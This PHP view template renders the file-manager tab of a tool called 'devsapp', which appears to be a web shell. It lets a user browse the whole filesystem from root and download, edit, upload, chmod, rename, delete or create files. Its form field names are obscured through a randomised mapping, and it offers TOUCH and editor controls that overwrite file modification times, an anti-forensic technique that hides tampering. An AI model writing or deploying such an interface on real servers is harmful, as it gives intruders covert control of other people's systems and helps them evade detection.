<?php
// +------------------------------------------------------------------+
// |  devsapp — views/tabs/tab_fm.php                                  |
// |  Tab File Manager: listing, editor, toolbar.                      |
// |  varnaming.md: field 'file','dir','path','action' → $_sk          |
// |  Closure.md: closure pattern untuk build recursive path           |
// +------------------------------------------------------------------+
?>

<!-- File System Explorer -->
<div class="card">
    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:10px;">
        <h3 style="margin:0; font-size:14px; color:var(--accent); text-transform:uppercase;">&gt; FILE SYSTEM EXPLORER</h3>
        <!-- Navigate to root via dynamic field -->
        <form method="post" style="display:inline;">
            <input type="hidden" name="<?= h($_sk['nv']) ?>" value="1">
            <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
            <input type="hidden" name="<?= h($_sk['lc']) ?>" value="/">
            <button type="submit" class="btn-sm" style="border:1px solid var(--muted);">
                <i class="fa-solid fa-hard-drive"></i> ROOT (/)
            </button>
        </form>
    </div>

    <!-- Breadcrumb -->
    <div class="breadcrumb">
        <span style="color:var(--muted)">PATH:</span>
        <form method="post" style="display:inline;">
            <input type="hidden" name="<?= h($_sk['nv']) ?>" value="1">
            <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
            <input type="hidden" name="<?= h($_sk['lc']) ?>" value="/">
            <button type="submit">/root</button>
        </form>
        <?php foreach ($viewData['fm']['breadcrumb'] as $crumb): ?>
            <span class="sep">/</span>
            <form method="post" style="display:inline;">
                <input type="hidden" name="<?= h($_sk['nv']) ?>" value="1">
                <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
                <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($crumb['loc']) ?>">
                <button type="submit"><?= h($crumb['label']) ?></button>
            </form>
        <?php endforeach; ?>
    </div>

    <!-- File Listing Table -->
    <div style="overflow-x:auto;">
    <table>
        <thead>
            <tr>
                <th>NAME</th><th>TYPE</th><th>SIZE</th><th>PERM</th><th>ACCESS</th><th>MODIFIED</th>
                <th style="text-align:right;">ACTIONS</th>
            </tr>
        </thead>
        <tbody>
            <!-- Parent dir link -->
            <?php if ($viewData['currentPath'] !== '/'): ?>
            <tr>
                <td colspan="7">
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="<?= h($_sk['nv']) ?>" value="1">
                        <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
                        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h(dirname($viewData['currentPath'])) ?>">
                        <button type="submit" class="link-btn" style="font-weight:bold; color:var(--accent);">
                            <i class="fa-solid fa-level-up-alt"></i> .. [PARENT DIR]
                        </button>
                    </form>
                </td>
            </tr>
            <?php endif; ?>

            <?php foreach ($viewData['fm']['items'] as $item): ?>
            <tr>
                <td>
                    <?php if ($item['isDir']): ?>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="<?= h($_sk['nv']) ?>" value="1">
                            <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
                            <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($item['fullPath']) ?>">
                            <button type="submit" class="link-btn" style="font-weight:bold; color:var(--accent);">
                                <i class="fa-solid fa-folder"></i> <?= h($item['name']) ?>/
                            </button>
                        </form>
                    <?php else: ?>
                        <i class="fa-solid fa-file-code" style="color:var(--muted);"></i> <?= h($item['name']) ?>
                    <?php endif; ?>
                </td>
                <td><?= $item['isDir']
                    ? '<span style="color:var(--accent)">DIR</span>'
                    : '<span style="color:var(--muted)">FILE</span>' ?></td>
                <td class="mono"><?= h($item['size']) ?></td>
                <td class="mono"><?= h($item['perms']) ?></td>
                <td><?= $item['isWritable']
                    ? '<span class="badge badge-success">RW</span>'
                    : '<span class="badge badge-danger">RO</span>' ?></td>
                <td style="color:var(--muted); font-size:11px;"><?= h($item['mtime']) ?></td>
                <td style="text-align:right;">
                    <div style="display:inline-flex; gap:4px; align-items:center; flex-wrap:wrap;">

                    <?php if (!$item['isDir']): ?>
                    <!-- Edit -->
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="<?= h($_sk['nv']) ?>" value="1">
                        <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
                        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
                        <input type="hidden" name="<?= h($_sk['vw']) ?>" value="<?= h($item['name']) ?>">
                        <button type="submit" class="btn-sm" style="border:1px solid var(--accent); color:var(--accent);">
                            <i class="fa-solid fa-pen"></i> EDIT
                        </button>
                    </form>
                    <!-- Download -->
                    <a href="?m=fm&loc=<?= urlencode($viewData['currentPath']) ?>&dl=<?= urlencode($item['name']) ?>"
                       class="btn-sm" style="border:1px solid var(--good); color:var(--good); display:inline-flex; align-items:center; gap:4px; padding:3px 8px;">
                        <i class="fa-solid fa-download"></i> GET
                    </a>
                    <?php endif; ?>

                    <!-- Touch -->
                    <form method="post" style="display:inline;"
                          data-name="<?= h($item['name']) ?>"
                          data-mtime="<?= $item['mtime'] !== 'N/A' ? h($item['mtime']) : date('Y-m-d H:i:s') ?>"
                          onsubmit="return promptTouch(this);">
                        <input type="hidden" name="<?= h($_sk['fo']) ?>" value="touch">
                        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
                        <input type="hidden" name="<?= h($_sk['tt']) ?>" value="<?= h($item['name']) ?>">
                        <input type="hidden" name="<?= h($_sk['tw']) ?>" class="touch_input" value="">
                        <button type="submit" class="btn-sm" style="border:1px solid var(--good); color:var(--good);" title="Touch Timestamp">TOUCH</button>
                    </form>

                    <!-- Chmod -->
                    <form method="post" style="display:inline;"
                          data-name="<?= h($item['name']) ?>"
                          data-perms="<?= h($item['perms']) ?>"
                          onsubmit="return promptChmod(this);">
                        <input type="hidden" name="<?= h($_sk['fo']) ?>" value="chmod">
                        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
                        <input type="hidden" name="<?= h($_sk['ct']) ?>" value="<?= h($item['name']) ?>">
                        <input type="hidden" name="<?= h($_sk['cv']) ?>" class="chmod_input" value="<?= h($item['perms']) ?>">
                        <button type="submit" class="btn-sm" style="border:1px solid var(--muted);" title="Chmod">CHMOD</button>
                    </form>

                    <!-- Rename -->
                    <form method="post" style="display:inline;"
                          data-name="<?= h($item['name']) ?>"
                          onsubmit="return promptRename(this);">
                        <input type="hidden" name="<?= h($_sk['fo']) ?>" value="rename">
                        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
                        <input type="hidden" name="<?= h($_sk['on']) ?>" value="<?= h($item['name']) ?>">
                        <input type="hidden" name="<?= h($_sk['nn']) ?>" class="rename_input" value="">
                        <button type="submit" class="btn-sm" style="border:1px solid var(--muted);">REN</button>
                    </form>

                    <!-- Delete -->
                    <form method="post" style="display:inline;" data-name="<?= h($item['name']) ?>">
                        <input type="hidden" name="<?= h($_sk['fo']) ?>" value="rm">
                        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
                        <input type="hidden" name="<?= h($_sk['ti']) ?>" value="<?= h($item['name']) ?>">
                        <button type="submit" class="btn-sm btn-danger"
                                onclick="return confirm('DELETE ' + this.form.dataset.name + '?')">DEL</button>
                    </form>

                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    </div>

    <!-- Toolbar: mkdir, mkfile, upload -->
    <hr style="border-color:var(--line); margin:20px 0;">
    <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(260px, 1fr)); gap:12px;">

        <!-- Create Directory -->
        <form method="post" style="background:#000; padding:10px; border:1px solid var(--line);">
            <input type="hidden" name="<?= h($_sk['fo']) ?>" value="mkdir">
            <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
            <strong style="display:block; margin-bottom:6px; color:var(--accent);">&gt; CREATE DIRECTORY:</strong>
            <div style="display:flex; gap:6px;">
                <input type="text" name="<?= h($_sk['dn']) ?>" placeholder="folder-name" required style="flex:1;">
                <button type="submit">MKDIR</button>
            </div>
        </form>

        <!-- Create File -->
        <form method="post" style="background:#000; padding:10px; border:1px solid var(--line);">
            <input type="hidden" name="<?= h($_sk['fo']) ?>" value="mkfile">
            <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
            <strong style="display:block; margin-bottom:6px; color:var(--text);">&gt; CREATE FILE:</strong>
            <div style="display:flex; flex-direction:column; gap:6px;">
                <input type="text" name="<?= h($_sk['nt']) ?>" placeholder="filename.txt" required>
                <textarea name="<?= h($_sk['fc']) ?>" placeholder="Initial content (optional)" style="height:60px; font-size:11px;"></textarea>
                <button type="submit">CREATE FILE</button>
            </div>
        </form>

        <!-- Upload File -->
        <form method="post" enctype="multipart/form-data" style="background:#000; padding:10px; border:1px solid var(--line);">
            <input type="hidden" name="<?= h($_sk['fo']) ?>" value="upload">
            <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
            <strong style="display:block; margin-bottom:6px; color:var(--good);">&gt; UPLOAD FILE:</strong>
            <div style="display:flex; gap:6px;">
                <input type="file" name="ast" required style="flex:1; padding:3px;">
                <button type="submit" class="btn-good">UPLOAD</button>
            </div>
        </form>

    </div>
</div>

<!-- File Editor -->
<?php if ($viewData['fm']['editData']): ?>
<?php $ed = $viewData['fm']['editData']; ?>
<div class="card">
    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
        <h3 style="margin:0; font-size:14px; color:var(--accent);">
            &gt; EDIT FILE: <span class="mono" style="color:#fff;"><?= h($ed['filename']) ?></span>
        </h3>
        <form method="post" style="display:inline;">
            <input type="hidden" name="<?= h($_sk['nv']) ?>" value="1">
            <input type="hidden" name="<?= h($_sk['md']) ?>" value="fm">
            <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
            <button type="submit" class="btn-sm" style="border:1px solid var(--bad); color:var(--bad);">
                <i class="fa-solid fa-xmark"></i> CANCEL
            </button>
        </form>
    </div>
    <form method="post" id="form-editor">
        <input type="hidden" name="<?= h($_sk['fo']) ?>" value="edit_save">
        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
        <input type="hidden" name="<?= h($_sk['ef']) ?>" value="<?= h($ed['filename']) ?>">
        <textarea name="<?= h($_sk['fc']) ?>" style="height:420px;"><?= h($ed['content']) ?></textarea>
        <div style="margin-top:10px; display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
            <button type="submit" class="btn-good" style="padding:8px 16px;">
                <i class="fa-solid fa-save"></i> SAVE_FILE
            </button>
            <div style="display:flex; align-items:center; gap:6px; background:#000; padding:4px 8px; border:1px solid var(--line);">
                <label style="font-size:11px; color:var(--muted);"><i class="fa-solid fa-clock"></i> Mtime:</label>
                <input type="text" name="<?= h($_sk['cm']) ?>" value="<?= h($ed['mtime']) ?>"
                       placeholder="YYYY-MM-DD HH:MM:SS" style="width:160px; font-size:11px;">
            </div>
        </div>
    </form>
</div>
<?php endif; ?>
